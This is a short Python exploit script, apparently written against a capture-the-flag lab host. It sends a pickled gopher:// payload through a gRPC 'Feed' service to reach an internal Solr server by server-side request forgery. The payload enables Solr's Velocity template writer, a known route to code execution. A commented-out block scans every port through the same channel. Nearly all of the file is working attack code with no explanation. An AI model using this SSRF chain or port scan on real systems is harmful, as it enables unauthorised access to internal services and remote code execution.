import grpc
import service_pb2
import service_pb2_grpc
import requests
import pickle
import os
from base64 import b64encode
import concurrent.futures


def gen_payload(payload):

    json = '{"feed_url": "gopher://localhost:8983/_' + payload + '" }'
    # print(json)
    return json


channel = grpc.insecure_channel('10.10.10.201:9000')
stub = service_pb2_grpc.PrintStub(channel)
payload = gen_payload("POST%20/solr/staging/config%20Http/1.1%0AHost%20localhost:8983%0AContent-type:%20Application/json%0AContennt-Length:%20207%0A%0A%7B'updatequeryresponsewriter':'startup':'lazy','name':'velocity','class':'solr.VelocityResponseWriter','template.base.dir':%20'','solr.resource.loader.enabled':%20'true','params.resource.loader.enabled':%20'true'%7D%7D%0A")
payload = pickle.dumps(payload)
response = stub.Feed(service_pb2.Contents(data=b64encode(payload)))
print(response)


# with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
#     jobs = []
#     for port in range(0, 65535):
#         jobs.append(executor.submit(port_check, port))

#     for future in concurrent.futures.as_completed(jobs):
#         port, output = future.result()
#         print(f"{output} - {port}")
# print(port_check('8983'))
# channel = grpc.insecure_channel('10.10.10.201:9000')
# stub = service_pb2_grpc.PrintStub(channel)
# payload = pickle.dumps(port_check())
# response = stub.Feed(service_pb2.Contents(data=b64encode(payload)))
